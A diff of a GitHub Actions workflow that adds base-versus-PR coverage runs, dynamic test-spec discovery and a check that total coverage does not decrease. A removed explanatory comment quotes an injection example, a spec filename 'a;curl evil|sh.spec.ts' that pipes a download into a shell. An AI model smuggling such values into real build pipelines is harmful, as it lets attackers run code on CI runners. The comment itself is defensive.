@@ -10,12 +10,18 @@ permissions:
 
 jobs:
   build:
+    name: ${{ matrix.revision == 'pr' && 'build' || 'build (coverage base)' }}
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        revision: [pr, base]
 
     steps:
       - name: Checkout the repository
         uses: actions/checkout@v4
         with:
+          ref: ${{ matrix.revision == 'base' && github.event.pull_request.base.sha || github.sha }}
           submodules: recursive
 
       - name: Install Foundry
@@ -55,6 +61,7 @@ jobs:
       # is the only fix: verify-merged-commit.yaml builds clean and saves only after those checks pass.
       # A PR pays only its own incremental recompile, since it still warms from the base's cache.
       - name: Create cache
+        if: matrix.revision == 'pr'
         uses: actions/cache/save@v4
         with:
           key: artifacts-l1-ci-${{ github.sha }}
@@ -67,7 +74,7 @@ jobs:
       - name: Upload artifacts for download
         uses: actions/upload-artifact@v4
         with:
-          name: build-artifacts
+          name: ${{ matrix.revision == 'base' && 'base-build-artifacts' || 'build-artifacts' }}
           path: |
             da-contracts/cache-forge
             da-contracts/out
@@ -271,19 +278,28 @@ jobs:
       - name: Compare ZKsyncOSVerifierPlonk.sol
         run: diff tools/verifier-gen/data/ZKsyncOSVerifierPlonk.sol l1-contracts/contracts/state-transition/verifiers/ZKsyncOSVerifierPlonk.sol
 
-  # Foundry coverage and the minimum-coverage gate. Independent of the Anvil interop legs
-  # below, which only add hits on top of this report and are not gated.
+  # Measure both revisions with the same workflow; retain the Foundry floor for the PR.
+  # The combined Foundry + Anvil reports are compared in coverage-non-decreasing.
   coverage-foundry:
+    name: ${{ matrix.revision == 'pr' && 'coverage-foundry' || 'coverage-foundry (base)' }}
     defaults:
       run:
         working-directory: l1-contracts
     needs: [build] # TODO return lint into dependencies when it's fully fixed
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        revision: [pr, base]
+    env:
+      # Only coverage uses a fixed seed; the ordinary test job keeps fuzzing independently.
+      FOUNDRY_FUZZ_SEED: "0x0"
 
     steps:
       - name: Checkout the repository
         uses: actions/checkout@v4
         with:
+          ref: ${{ matrix.revision == 'base' && github.event.pull_request.base.sha || github.sha }}
           submodules: recursive
 
       - name: Use Node.js
@@ -299,9 +315,9 @@ jobs:
         run: yarn
 
       - name: Restore this commit's artifacts
-        uses: ./.github/actions/restore-ci-artifacts
-
-      # --- 1. Foundry coverage (unchanged) ---
+        uses: actions/download-artifact@v4
+        with:
+          name: ${{ matrix.revision == 'base' && 'base-build-artifacts' || 'build-artifacts' }}
 
       # `forge coverage` runs the suite itself, and the `test-foundry` job already gates
       # on the full (unfiltered) `yarn test:foundry`, so there is no separate test run here.
@@ -334,9 +350,10 @@ jobs:
             echo '```'
             lcov --summary lcov.info --rc branch_coverage=1 2>&1
             echo '```'
-          } >> $GITHUB_STEP_SUMMARY
+          } >> "$GITHUB_STEP_SUMMARY"
 
       - name: Verify Foundry minimum coverage
+        if: matrix.revision == 'pr'
         uses: zgosalvez/github-actions-report-lcov@df68834145a4a567247d6a3ea8565c4c39d1fd17 # v4.1.23
         with:
           coverage-files: ./l1-contracts/lcov.info
@@ -347,7 +364,7 @@ jobs:
       - name: Upload Foundry coverage
         uses: actions/upload-artifact@v4
         with:
-          name: coverage-foundry-lcov
+          name: ${{ matrix.revision == 'base' && 'base-coverage-foundry-lcov' || 'coverage-foundry-lcov' }}
           path: l1-contracts/lcov.info
           if-no-files-found: error
 
@@ -360,7 +377,7 @@ jobs:
     # Without an explicit name, GitHub builds the job name from every matrix value, so the
     # spec list would end up in the check name and required-check names would shift whenever
     # the grouping changed. Name it from the stable group label only.
-    name: coverage-anvil (${{ matrix.group.name }})
+    name: ${{ format('coverage-anvil ({0}{1})', matrix.group.name, matrix.revision == 'base' && ', base' || '') }}
     needs: [build]
     runs-on: ubuntu-latest
     strategy:
@@ -368,22 +385,20 @@ jobs:
       # partial merge anyway, since it requires every group to report.
       fail-fast: false
       matrix:
-        # Listed by hand, so this file says what runs. The split is within a few percent, and
-        # coverage-foundry outlasts both groups, so rebalancing cannot move the stage's wall clock.
-        #
-        # A spec missing from these lists would never run, with every job green — so coverage-report
-        # checks the specs the groups report having *run* against the specs on disk
-        # (assertEverySpecRan), which also catches a group that quietly skipped one.
+        revision: [pr, base]
+        # Discover each revision's specs independently: a PR may add, delete or rename a test.
+        # The reporting job still verifies that every spec actually ran.
         group:
           - name: group-1
-            specs: 03-interop-transfer.spec.ts 04-gateway-setup.spec.ts 06-gateway-interop.spec.ts 09-interop-unbundle.spec.ts 13-imt-atomic-swap.spec.ts
+            index: 0
           - name: group-2
-            specs: 01-deployment-verification.spec.ts 02-direct-bridge.spec.ts 05-gateway-bridge.spec.ts 07-interop-bundles.spec.ts 08-interop-messages.spec.ts
+            index: 1
 
     steps:
       - name: Checkout the repository
         uses: actions/checkout@v4
         with:
+          ref: ${{ matrix.revision == 'base' && github.event.pull_request.base.sha || github.sha }}
           submodules: recursive
 
       - name: Use Node.js
@@ -396,7 +411,9 @@ jobs:
         run: yarn
 
       - name: Restore this commit's artifacts
-        uses: ./.github/actions/restore-ci-artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: ${{ matrix.revision == 'base' && 'base-build-artifacts' || 'build-artifacts' }}
 
       # Committed chain states use the newer Anvil trace schema, while the
       # coverage build above stays on the `build` pin for reproducible bytecode.
@@ -417,18 +434,23 @@ jobs:
         working-directory: l1-contracts/test/anvil-interop
         env:
           ANVIL_INTEROP_MAX_PARALLEL_WORKERS: "4"
-          # Via env, not interpolated into the script: `${{ }}` is expanded into the shell *text*
-          # before bash sees it, so a spec file named `a;curl evil|sh.spec.ts` would execute. The
-          # planner also rejects such names, but the boundary is enforced on both sides. Unquoted
-          # below because word-splitting on spaces is exactly what the loop wants.
-          SPECS: ${{ matrix.group.specs }}
+          GROUP_INDEX: ${{ matrix.group.index }}
+          GROUP_COUNT: "2"
         run: |
-          args=""
+          SPECS=$(yarn -s ts-node -e '
+            import { discoverSpecs } from "./src/core/specs";
+            const specs = discoverSpecs("test/hardhat").filter(
+              (_, index) => index % Number(process.env.GROUP_COUNT) === Number(process.env.GROUP_INDEX)
+            );
+            if (specs.length === 0) { throw new Error("Coverage group has no specs"); }
+            process.stdout.write(specs.join(" "));
+          ')
+          args=()
           for spec in $SPECS; do
-            args="$args --spec test/anvil-interop/test/hardhat/$spec"
+            args+=(--spec "test/anvil-interop/test/hardhat/$spec")
           done
-          echo "Running${args}"
-          ANVIL_COVERAGE_MODE=1 yarn ts-node run-coverage.ts $args
+          echo "Running ${args[*]}"
+          ANVIL_COVERAGE_MODE=1 yarn ts-node run-coverage.ts "${args[@]}"
 
       # cleanup.sh is scoped to one port offset, so a cancelled run would otherwise leave the
       # in-process shard workers' chains behind. Sweep every offset a shard can use.
@@ -443,7 +465,7 @@ jobs:
       - name: Upload group coverage
         uses: actions/upload-artifact@v4
         with:
-          name: coverage-anvil-${{ matrix.group.name }}
+          name: ${{ matrix.revision == 'base' && 'base-' || '' }}coverage-anvil-${{ matrix.group.name }}
           # specs-run.json is what coverage-report checks against the specs on disk.
           path: |
             l1-contracts/coverage/anvil/anvil-lcov.info
@@ -454,8 +476,13 @@ jobs:
   # summaries. Needs neither the build artifacts nor forge — only the LCOV files, node for
   # the merge scripts, and lcov for filtering and summaries.
   coverage-report:
+    name: ${{ matrix.revision == 'pr' && 'coverage-report' || 'coverage-report (base)' }}
     needs: [coverage-foundry, coverage-anvil]
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        revision: [pr, base]
     defaults:
       run:
         working-directory: l1-contracts
@@ -463,6 +490,8 @@ jobs:
     steps:
       - name: Checkout the repository
         uses: actions/checkout@v4
+        with:
+          ref: ${{ matrix.revision == 'base' && github.event.pull_request.base.sha || github.sha }}
 
       - name: Use Node.js
         uses: actions/setup-node@v6
@@ -486,13 +515,13 @@ jobs:
       - name: Download Foundry coverage
         uses: actions/download-artifact@v4
         with:
-          name: coverage-foundry-lcov
+          name: ${{ matrix.revision == 'base' && 'base-coverage-foundry-lcov' || 'coverage-foundry-lcov' }}
           path: l1-contracts
 
       - name: Download group coverage
         uses: actions/download-artifact@v4
         with:
-          pattern: coverage-anvil-group-*
+          pattern: ${{ matrix.revision == 'base' && 'base-coverage-anvil-group-*' || 'coverage-anvil-group-*' }}
           path: l1-contracts/coverage/anvil/shards
 
       # Fails if no group contributed a report, so a broken group cannot pass as
@@ -528,7 +557,7 @@ jobs:
             echo '```'
             lcov --summary coverage/anvil-rebased-lcov.info --rc branch_coverage=1 2>&1
             echo '```'
-          } >> $GITHUB_STEP_SUMMARY
+          } >> "$GITHUB_STEP_SUMMARY"
 
       - name: Generate Anvil untested lines report
         run: npx ts-node scripts/generate-untested-lines-report.ts coverage/anvil-rebased-lcov.info coverage/ANVIL_UNTESTED_LINES_REPORT.md
@@ -545,7 +574,7 @@ jobs:
             echo '```'
             lcov --summary coverage/merged-lcov.info --rc branch_coverage=1 2>&1
             echo '```'
-          } >> $GITHUB_STEP_SUMMARY
+          } >> "$GITHUB_STEP_SUMMARY"
 
       - name: Generate merged untested lines report
         run: npx ts-node scripts/generate-untested-lines-report.ts coverage/merged-lcov.info coverage/MERGED_UNTESTED_LINES_REPORT.md
@@ -554,7 +583,7 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: coverage-reports
+          name: ${{ matrix.revision == 'base' && 'base-coverage-reports' || 'coverage-reports' }}
           path: |
             l1-contracts/lcov.info
             l1-contracts/coverage/anvil/anvil-lcov.info
@@ -565,6 +594,64 @@ jobs:
             l1-contracts/coverage/merged-lcov.info
             l1-contracts/coverage/MERGED_UNTESTED_LINES_REPORT.md
           if-no-files-found: warn
+
+  coverage-non-decreasing:
+    needs: [coverage-report]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout the tested merge commit
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.sha }}
+          fetch-depth: 2
+
+      - name: Use Node.js
+        uses: actions/setup-node@v6
+        with:
+          node-version-file: .nvmrc
+
+      - name: Test the coverage comparison
+        run: node --test .github/scripts/coverage/compare-lcov.test.js
+
+      - name: Require complete coverage for both revisions
+        env:
+          COVERAGE_RESULT: ${{ needs.coverage-report.result }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+        run: |
+          if [ "$COVERAGE_RESULT" != "success" ]; then
+            echo "::error::Base and PR coverage must both complete successfully before comparison."
+            exit 1
+          fi
+          if [ "$(git rev-parse HEAD^1)" != "$BASE_SHA" ]; then
+            echo "::error::The tested merge commit does not incorporate the expected PR base. Rerun on an updated PR."
+            exit 1
+          fi
+
+      - name: Download base coverage
+        uses: actions/download-artifact@v4
+        with:
+          name: base-coverage-reports
+          path: coverage-comparison/base
+
+      - name: Download PR coverage
+        uses: actions/download-artifact@v4
+        with:
+          name: coverage-reports
+          path: coverage-comparison/pr
+
+      - name: Verify total coverage does not decrease
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          PR_SHA: ${{ github.sha }}
+        run: |
+          node .github/scripts/coverage/compare-lcov.js \
+            coverage-comparison/base/coverage/merged-lcov.info \
+            coverage-comparison/pr/coverage/merged-lcov.info \
+            "$BASE_SHA" "$PR_SHA"
 
   # FIXME: restore gas report CI
   # gas-report:
